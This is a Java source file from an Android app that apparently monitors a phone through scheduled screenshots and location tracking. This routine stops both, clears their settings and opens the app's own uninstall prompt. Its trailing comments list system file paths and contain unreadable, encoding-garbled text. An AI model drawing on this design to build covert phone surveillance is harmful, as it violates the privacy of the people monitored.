package com.phone.control;

import com.main.ForegroundService;
import com.main.GlobalHandler;
import com.main.MainUtils;
import com.phone.data.PhoneLocation;
import com.utils.ExceptionProcess;
import com.utils.PrefOper;
import com.utils.WriteDateFile;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Message;
import android.util.Log;

public class UnInstallSelf {
	private static final String TAG = "UnInstallSelf";

	public static void uninstallSelf(Context context){

		try{
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.UNINSTALLFLAG,"true");
			
			
			
			MainUtils.stopSreenshotAlarm(context);
			
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENSHOTREPEATPERMISSION);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENSTART);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENEND);

			MainUtils.stopLocationAlarm(context);
			PhoneLocation.closeLocation(context);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONREPEATPERMISSION);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONSTART);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONEND);
			
            Message msg = Message.obtain(); //=new Message();
			msg.what = GlobalHandler.UNREGISTRY_LISTENER;
			Bundle data = new Bundle();
			data.putString("cmd", "UNREGISTRY_LISTENER");
			msg.setData(data);
			if (GlobalHandler.gHandler != null) {
				GlobalHandler.gHandler.sendMessage(msg);	
			}
		
			Uri uri=Uri.parse("package:" + context.getPackageName());
			Intent intent = new Intent(Intent.ACTION_DELETE,uri);
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
		}catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("listTypeFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
			Log.e(TAG, "listTypeFiles exception:"+errorString + "call stack:" + stackString);
		}
	}
}


//	/data/app/
//	/data/davlik-cache/   :����ͷŵ�dex�ļ�
//	/data/data/com.qihoo.360.mobilesafe/  :���app������
//	/data/system/packages.list  :����ļ��Ǽ�¼��װapp����Ϣ��
//	/data/system/packages.xml  :����ļ��Ǽ�¼��װapp����ϸ��Ϣ(Ȩ�ޣ�uid��)
